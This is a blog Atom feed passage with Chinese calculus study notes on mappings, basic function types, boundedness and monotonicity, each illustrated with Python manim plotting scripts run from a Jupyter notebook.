<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ascotbe</title>
  
  
  <link href="https://www.ascotbe.com/atom.xml" rel="self"/>
  
  <link href="https://www.ascotbe.com/"/>
  <updated>2023-01-05T06:17:01.848Z</updated>
  <id>https://www.ascotbe.com/</id>
  
  <author>
    <name>ascotbe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>高等数学</title>
    <link href="https://www.ascotbe.com/2022/12/07/FurtherMathematics_0x01/"/>
    <id>https://www.ascotbe.com/2022/12/07/FurtherMathematics_0x01/</id>
    <published>2022-12-07T15:58:53.000Z</published>
    <updated>2023-01-05T06:17:01.848Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_1.jpg" alt="0_1"></p><h2 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h2><p>定义：$X$、$Y$ 非空集合, 法则 $f$ , 对 $X$ 中每个元素 $x$  。唯一的$y$  与之对应, $f: X \rightarrow Y$</p><p>三要素：$X$ 原像、$f$ 映射、$R_{f}$ 值域</p><p>$x \in X$对应的$y$是唯一的 , $R<em>{f} \subset Y R</em>{f} \neq Y$</p><div class="table-container"><table><thead><tr><th>名称</th><th>满足条件</th></tr></thead><tbody><tr><td>满射</td><td>$R_{f} =  Y$</td></tr><tr><td>单射</td><td>$x<em>{1} \neq x</em>{2}, f\left(x<em>{1}\right) \neq f\left(x</em>{2}\right)$</td></tr><tr><td>一一映射</td><td>既是单射又是满射</td></tr><tr><td>逆映射</td><td>设$f: X \rightarrow Y$ 单射 , 每个 $y \in R_{f}$  都有唯一的 $x \in X$</td></tr><tr><td>复合映射</td><td>$f[g(x)]$</td></tr></tbody></table></div><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数的概念"><a href="#函数的概念" class="headerlink" title="函数的概念"></a>函数的概念</h3><p>定义：设数集$  D \subset \mathbf{R}$ , 则称映射$ f: D \rightarrow \mathbf{R}$ 为定义在$ D$ 上的函数记为$ \underline {y=f(x), x \in D}$</p><p>其中$x$称为自变量,$ y$ 称为因变量, $D$ 称为定义域,记作 $D<em>{f}$ , 即 $D</em>{f}=D$</p><h4 id="常值函数"><a href="#常值函数" class="headerlink" title="常值函数"></a>常值函数</h4><p>$y=2,  x \in ( -\infty,+\infty)$</p><p>定义域：$(-\infty,+\infty)$   值域：${2}$</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#常值函数</span></span><br><span class="line"><span class="keyword">from</span> manim <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogScalingExample</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-<span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>],</span><br><span class="line">            y_range=[-<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>],</span><br><span class="line">            tips=<span class="literal">False</span>,</span><br><span class="line">            axis_config=&#123;<span class="string">&quot;include_numbers&quot;</span>: <span class="literal">True</span>&#125;, <span class="comment">#是否将数字添加到刻度线。</span></span><br><span class="line">            <span class="comment">#y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># x_min must be &gt; 0 because log is undefined at 0.</span></span><br><span class="line">        graph = ax.plot(<span class="keyword">lambda</span> x: <span class="number">2</span>, x_range=[-<span class="number">2</span>,<span class="number">2</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line"></span><br><span class="line">        line_graph = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">0</span>],</span><br><span class="line">            y_values = [<span class="number">2</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">3</span>,  fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )</span><br><span class="line">        sin_label = ax.get_graph_label(</span><br><span class="line">            graph, <span class="string">&quot;y=2&quot;</span>, x_val=<span class="number">2</span>,direction=UP/<span class="number">1</span> , color=GREEN</span><br><span class="line">        )</span><br><span class="line">        self.add(ax, graph,line_graph,sin_label)</span><br><span class="line"><span class="comment"># jupyter notebook 的魔法函数运行方式</span></span><br><span class="line">%manim -v WARNING -qh --<span class="built_in">format</span>=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/1.png" alt="output_4_0"><br>​    </p><h4 id="绝对值函数"><a href="#绝对值函数" class="headerlink" title="绝对值函数"></a>绝对值函数</h4><p>$\begin{align}<br>y &amp; = |x| = \left{\begin{array}{lc}<br>-x, &amp; x&lt;0, \<br>x, &amp; x \geqslant 0<br>\end{array}\right.<br>\end{align}$</p><p>定义域：$(-\infty,+\infty)$   值域：$R_{f}=[0,+\infty)$</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#绝对值函数</span></span><br><span class="line"><span class="keyword">from</span> manim <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogScalingExample</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>],</span><br><span class="line">            y_range=[<span class="number">0</span>, <span class="number">3</span>, <span class="number">1</span>],</span><br><span class="line">            tips=<span class="literal">False</span>,</span><br><span class="line">            axis_config=&#123;<span class="string">&quot;include_numbers&quot;</span>: <span class="literal">True</span>&#125;, <span class="comment">#是否将数字添加到刻度线。</span></span><br><span class="line">            <span class="comment">#y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># x_min must be &gt; 0 because log is undefined at 0.</span></span><br><span class="line">        graph = ax.plot(<span class="keyword">lambda</span> x: <span class="built_in">abs</span>(x), x_range=[-<span class="number">2</span>,<span class="number">2</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># line_graph = ax.plot_line_graph(</span></span><br><span class="line">        <span class="comment">#     x_values = [0],</span></span><br><span class="line">        <span class="comment">#     y_values = [2],</span></span><br><span class="line">        <span class="comment">#     line_color=GOLD_E,</span></span><br><span class="line">        <span class="comment">#     vertex_dot_style=dict(stroke_width=3,  fill_color=PURPLE),</span></span><br><span class="line">        <span class="comment">#     stroke_width = 4,</span></span><br><span class="line">        <span class="comment"># )</span></span><br><span class="line">        sin_label = ax.get_graph_label(</span><br><span class="line">            graph, <span class="string">&quot;y=|x|&quot;</span>, x_val=<span class="number">2</span>,direction=UP/<span class="number">1</span> , color=GREEN</span><br><span class="line">        )</span><br><span class="line">        self.add(ax, graph,sin_label)</span><br><span class="line"><span class="comment"># jupyter notebook 的魔法函数运行方式</span></span><br><span class="line">%manim -v WARNING -qh  --<span class="built_in">format</span>=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p>​    <img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/2.png" alt="output_6_0"></p><h4 id="符号函数"><a href="#符号函数" class="headerlink" title="符号函数"></a>符号函数</h4><p>$\begin{align}<br> y &amp; = \operatorname{sgn} x  = \left{\begin{array}{ll}<br>-1, &amp; x<0, \\0, & x & = 0, \\1, & x>0<br>\end{array}\right.<br>\end{align}$</p><p>定义域：$D=(-\infty,+\infty)$   值域：$R_{f}={-1,0,1)$</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#符号函数</span></span><br><span class="line"><span class="keyword">from</span> manim <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogScalingExample</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>],</span><br><span class="line">            y_range=[-<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>],</span><br><span class="line">            tips=<span class="literal">False</span>,</span><br><span class="line">            axis_config=&#123;<span class="string">&quot;include_numbers&quot;</span>: <span class="literal">True</span>&#125;, <span class="comment">#是否将数字添加到刻度线。</span></span><br><span class="line">            <span class="comment">#y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        graph1 = ax.plot(<span class="keyword">lambda</span> x: -<span class="number">1</span>, x_range=[-<span class="number">1</span>,<span class="number">0</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph2 = ax.plot(<span class="keyword">lambda</span> x:  <span class="number">0</span>, x_range=[<span class="number">0</span>,<span class="number">0</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph3 = ax.plot(<span class="keyword">lambda</span> x:  <span class="number">1</span>, x_range=[<span class="number">0</span>,<span class="number">1</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        x_less_than_zero = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">0</span>],</span><br><span class="line">            y_values = [-<span class="number">1</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">3</span>,  fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#小于0</span></span><br><span class="line">        x_equal_zero = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">0</span>],</span><br><span class="line">            y_values = [<span class="number">0</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">3</span>,  fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#等于1</span></span><br><span class="line">        x_more_than_the_zero = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">0</span>],</span><br><span class="line">            y_values = [<span class="number">1</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">3</span>,  fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#大于1</span></span><br><span class="line">        graph1_label = ax.get_graph_label(</span><br><span class="line">            graph1, <span class="string">&quot;y=-1&quot;</span>, x_val=-<span class="number">1</span>,direction=UR , color=GREEN</span><br><span class="line">        )</span><br><span class="line">        graph2_label = ax.get_graph_label(</span><br><span class="line">            graph2, <span class="string">&quot;y=0&quot;</span>, x_val=<span class="number">0</span>,direction=UR , color=GREEN</span><br><span class="line">        )</span><br><span class="line">        graph3_label = ax.get_graph_label(</span><br><span class="line">            graph3, <span class="string">&quot;y=1&quot;</span>, x_val=<span class="number">1</span>,direction=UR , color=GREEN</span><br><span class="line">        )</span><br><span class="line">        self.add(ax, graph1,graph2,graph3,x_less_than_zero,x_equal_zero,x_more_than_the_zero,graph1_label,graph2_label,graph3_label)</span><br><span class="line"><span class="comment"># jupyter notebook 的魔法函数运行方式</span></span><br><span class="line">%manim -v WARNING -qh --<span class="built_in">format</span>=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/3.png" alt="output_8_0"></p><p>​    </p><h4 id="取整函数"><a href="#取整函数" class="headerlink" title="取整函数"></a>取整函数</h4><p>$\begin{align}<br>y &amp; = [x]<br>\end{align}$    </p><p>定义：设$x$为任一实数，不超过$x$的最大整数称为$x$的整数部分</p><p>比如：$[1.03]=1;[0.36]=0;[-1.3]=-2;[3]=3;[\frac{5}{7}]=0$</p><p>定义域：$(-\infty,+\infty)$   值域：$R_{f}=Z$</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#取整函数</span></span><br><span class="line"><span class="keyword">from</span> manim <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogScalingExample</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-<span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>],</span><br><span class="line">            y_range=[-<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>],</span><br><span class="line">            tips=<span class="literal">False</span>,</span><br><span class="line">            axis_config=&#123;<span class="string">&quot;include_numbers&quot;</span>: <span class="literal">True</span>&#125;, <span class="comment">#是否将数字添加到刻度线。</span></span><br><span class="line">            <span class="comment">#y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        graph1 = ax.plot(<span class="keyword">lambda</span> x: -<span class="number">2</span>, x_range=[-<span class="number">2</span>,-<span class="number">1</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph2 = ax.plot(<span class="keyword">lambda</span> x:  -<span class="number">1</span>, x_range=[-<span class="number">1</span>,<span class="number">0</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph3 = ax.plot(<span class="keyword">lambda</span> x:  <span class="number">0</span>, x_range=[<span class="number">0</span>,<span class="number">1</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph4 = ax.plot(<span class="keyword">lambda</span> x: <span class="number">1</span>, x_range=[<span class="number">1</span>,<span class="number">2</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph5 = ax.plot(<span class="keyword">lambda</span> x:  <span class="number">2</span>, x_range=[<span class="number">2</span>,<span class="number">3</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line"></span><br><span class="line">        x_graph1_1 = ax.plot_line_graph(</span><br><span class="line">            x_values = [-<span class="number">2</span>],</span><br><span class="line">            y_values = [-<span class="number">2</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">0</span>,  fill_opacity=<span class="number">1</span>, fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#小于0</span></span><br><span class="line">        x_graph1_2 = ax.plot_line_graph(</span><br><span class="line">            x_values = [-<span class="number">1</span>],</span><br><span class="line">            y_values = [-<span class="number">2</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">2</span>,  fill_opacity=<span class="number">1</span>),</span><br><span class="line">            stroke_width = <span class="number">0</span>,</span><br><span class="line">        )        </span><br><span class="line">        x_graph2_1 = ax.plot_line_graph(</span><br><span class="line">            x_values = [-<span class="number">1</span>],</span><br><span class="line">            y_values = [-<span class="number">1</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">0</span>,  fill_opacity=<span class="number">1</span>, fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#小于0</span></span><br><span class="line">        x_graph2_2 = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">0</span>],</span><br><span class="line">            y_values = [-<span class="number">1</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">2</span>,  fill_opacity=<span class="number">1</span>),</span><br><span class="line">            stroke_width = <span class="number">0</span>,</span><br><span class="line">        )</span><br><span class="line">        x_graph3_1 = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">0</span>],</span><br><span class="line">            y_values = [<span class="number">0</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">0</span>,  fill_opacity=<span class="number">1</span>, fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#小于0</span></span><br><span class="line">        x_graph3_2 = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">1</span>],</span><br><span class="line">            y_values = [<span class="number">0</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">2</span>,  fill_opacity=<span class="number">1</span>),</span><br><span class="line">            stroke_width = <span class="number">0</span>,</span><br><span class="line">        )        </span><br><span class="line">        x_graph4_1 = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">1</span>],</span><br><span class="line">            y_values = [<span class="number">1</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">0</span>,  fill_opacity=<span class="number">1</span>, fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#小于0</span></span><br><span class="line">        x_graph4_2 = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">2</span>],</span><br><span class="line">            y_values = [<span class="number">1</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">2</span>,  fill_opacity=<span class="number">1</span>),</span><br><span class="line">            stroke_width = <span class="number">0</span>,</span><br><span class="line">        )</span><br><span class="line">        x_graph5_1 = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">2</span>],</span><br><span class="line">            y_values = [<span class="number">2</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">0</span>,  fill_opacity=<span class="number">1</span>, fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#小于0</span></span><br><span class="line">        x_graph5_2 = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">3</span>],</span><br><span class="line">            y_values = [<span class="number">2</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">2</span>,  fill_opacity=<span class="number">1</span>),</span><br><span class="line">            stroke_width = <span class="number">0</span>,</span><br><span class="line">        )</span><br><span class="line">        self.add(ax, graph1,graph2,graph3,graph4,graph5,x_graph1_1,x_graph1_2,x_graph2_1,x_graph2_2,x_graph3_1,x_graph3_2,x_graph4_1,x_graph4_2,x_graph5_1,x_graph5_2)</span><br><span class="line"><span class="comment"># jupyter notebook 的魔法函数运行方式</span></span><br><span class="line">%manim -v WARNING -qh  --<span class="built_in">format</span>=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/4.png" alt="output_10_0">  </p><h4 id="分段函数"><a href="#分段函数" class="headerlink" title="分段函数"></a>分段函数</h4><p>$\begin{align}<br>y &amp; = f(x) = \left{\begin{array}{ll}<br>2 \sqrt{x}, &amp; 0 \leqslant x \leqslant 1 \<br>1+x, &amp; x&gt;1<br>\end{array}\right.<br>\end{align}$</p><p>定义：在自变量的不同变化范围中，对应法则用不同的式子来表达的函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#分段函数</span></span><br><span class="line"><span class="keyword">from</span> manim <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogScalingExample</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>],</span><br><span class="line">            y_range=[-<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>],</span><br><span class="line">            tips=<span class="literal">False</span>,</span><br><span class="line">            axis_config=&#123;<span class="string">&quot;include_numbers&quot;</span>: <span class="literal">True</span>&#125;, <span class="comment">#是否将数字添加到刻度线。</span></span><br><span class="line">            <span class="comment">#y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        graph1 = ax.plot(<span class="keyword">lambda</span> x: x**<span class="number">2</span>+<span class="number">1</span>, x_range=[<span class="number">0</span>,<span class="number">1</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph2 = ax.plot(<span class="keyword">lambda</span> x:  <span class="number">1</span>+x, x_range=[-<span class="number">1</span>,<span class="number">0</span>], use_smoothing=<span class="literal">False</span>,color=YELLOW)</span><br><span class="line">        graph3 = ax.plot(<span class="keyword">lambda</span> x:  -<span class="number">1</span>, x_range=[-<span class="number">2</span>,-<span class="number">1</span>], use_smoothing=<span class="literal">False</span>,color=BLUE)</span><br><span class="line">        graph1_label = ax.get_graph_label(</span><br><span class="line">            graph1, <span class="string">&quot;y=x^2+1&quot;</span>, x_val=<span class="number">1</span>,direction=UR , color=GREEN</span><br><span class="line">        )</span><br><span class="line">        graph2_label = ax.get_graph_label(</span><br><span class="line">            graph2, <span class="string">&quot;y=1+x&quot;</span>, x_val=-<span class="number">1</span>,direction=<span class="number">6</span>+LEFT*<span class="number">5</span>, color=GREEN</span><br><span class="line">        )</span><br><span class="line">        graph3_label = ax.get_graph_label(</span><br><span class="line">            graph3, <span class="string">&quot;y=-1&quot;</span>, x_val=-<span class="number">2</span>,direction=UR , color=GREEN</span><br><span class="line">        )</span><br><span class="line">        self.add(ax, graph1,graph2,graph3,graph1_label,graph2_label,graph3_label)</span><br><span class="line"><span class="comment"># jupyter notebook 的魔法函数运行方式</span></span><br><span class="line">%manim -v WARNING -qh  --<span class="built_in">format</span>=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/5.png" alt="output_12_0"></p><h3 id="函数的特性"><a href="#函数的特性" class="headerlink" title="函数的特性"></a>函数的特性</h3><h4 id="有界性"><a href="#有界性" class="headerlink" title="有界性"></a>有界性</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>存在实数$M&gt;0$，使得对于集$X$中的所有$x$，都有${\displaystyle |f(x)|\leq M}$。</p><p>如果对于集合$X$中的所有$x$，都有${\displaystyle f(x)\leq A}$，则函数$f$称为<strong>上有界的</strong>，$A$就是它的一个上界</p><p>如果对于集合$X$中的所有$x$，都有${\displaystyle f(x)\geq B}$，则函数$f$称为<strong>下有界的</strong>，$B$就是它的一个下界。</p><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p>$\begin{align}<br>f(x) &amp; = \frac{1}{x^{2}-1}<br>\end{align}$</p><p>$x$不等于−1或1是无界的（等于的话就没有意义）。如果把函数的定义域限制为$[2,\infty)$，则函数就是有界的。</p><p>$\begin{align}<br>y &amp; = \sin x<br>\end{align}$在其定义域内有界</p><p>$\begin{align}<br>y &amp; = x^{2}<br>\end{align}$在其定义域内无界</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#有界性</span></span><br><span class="line"><span class="keyword">from</span> manim <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogScalingExample</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-<span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>],</span><br><span class="line">            y_range=[-<span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>],</span><br><span class="line">            tips=<span class="literal">False</span>,</span><br><span class="line">            axis_config=&#123;<span class="string">&quot;include_numbers&quot;</span>: <span class="literal">True</span>&#125;, <span class="comment">#是否将数字添加到刻度线。</span></span><br><span class="line">            <span class="comment">#y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        graph1 = ax.plot(<span class="keyword">lambda</span> x: x**<span class="number">2</span>, x_range=[-<span class="number">2</span>,<span class="number">2</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph2 = ax.plot(<span class="keyword">lambda</span> x: np.sin(x), x_range=[-<span class="number">1</span> * np.pi, <span class="number">1</span> * np.pi], use_smoothing=<span class="literal">False</span>,color=YELLOW)</span><br><span class="line">        graph1_label = ax.get_graph_label(</span><br><span class="line">            graph1, <span class="string">&quot;y=x^2&quot;</span>, x_val=<span class="number">2</span>,direction=UR , color=RED</span><br><span class="line">        )</span><br><span class="line">        graph2_label = ax.get_graph_label(</span><br><span class="line">            graph2, <span class="string">&quot;y=\sin x&quot;</span>, x_val=-<span class="number">2</span>,direction=LEFT*<span class="number">6</span>+<span class="number">5</span>, color=YELLOW</span><br><span class="line">        )</span><br><span class="line">        self.add(ax, graph1,graph2,graph1_label,graph2_label)</span><br><span class="line">%manim -v WARNING -qh  --<span class="built_in">format</span>=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/6.png" alt="2"></p><p>红线不具有有界性，黄线具有有界性</p><h4 id="单调性"><a href="#单调性" class="headerlink" title="单调性"></a>单调性</h4><h5 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h5><p>若函数$x$值随着自变量的增大而增大，则函数是单调增加的</p><p>若函数$x$值随着自变量的增大而减小，则函数是单调减少的</p><h5 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h5><p>$\begin{align}<br>y &amp; =  x^2<br>\end{align}$</p><p>在$(-\infty,0)$单调递减，在$(0,\infty)$单调递增</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from manim import *</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">class LogScalingExample(Scene):</span><br><span class="line">    def construct(self):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-3, 3, 1],</span><br><span class="line">            y_range=[-5, 5, 1],</span><br><span class="line">            tips=False,</span><br><span class="line">            axis_config=&#123;&quot;include_numbers&quot;: True&#125;, #是否将数字添加到刻度线。</span><br><span class="line">            #y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        graph1 = ax.plot(lambda x: x**2, x_range=[-2,2], use_smoothing=False,color=RED)</span><br><span class="line">        </span><br><span class="line">        graph1_label = ax.get_graph_label(</span><br><span class="line">            graph1, &quot;y=x^2&quot;, x_val=2,direction=UR , color=RED</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.add(ax, graph1,graph1_label)</span><br><span class="line"># jupyter notebook 的魔法函数运行方式</span><br><span class="line">%manim -v WARNING -qh  --format=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/7.png" alt="LogScalingExample@2022-12-13@13-35-21"></p><p>$\begin{align}<br>y &amp; =  x^3<br>\end{align}$</p><p>在整个数轴上单调递增</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from manim import *</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">class LogScalingExample(Scene):</span><br><span class="line">    def construct(self):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-3, 3, 1],</span><br><span class="line">            y_range=[-6, 6, 1],</span><br><span class="line">            tips=False,</span><br><span class="line">            axis_config=&#123;&quot;include_numbers&quot;: True&#125;, #是否将数字添加到刻度线。</span><br><span class="line">            #y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        graph1 = ax.plot(lambda x: x**3, x_range=[-2,2], use_smoothing=False,color=RED)</span><br><span class="line">        </span><br><span class="line">        graph1_label = ax.get_graph_label(</span><br><span class="line">            graph1, &quot;y=x^3&quot;, x_val=2,direction=UR , color=RED</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.add(ax, graph1,graph1_label)</span><br><span class="line"># jupyter notebook 的魔法函数运行方式</span><br><span class="line">%manim -v WARNING -qh  --format=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/8.png" alt="1"></p><p>$\begin{align}<br>y &amp; = x^{-1} = \frac{1}{x}<br>\end{align}$</p><p>在$(-\infty,0)$单调递减，在$(0,\infty)$也是单调递减</p><h4 id="奇偶性"><a 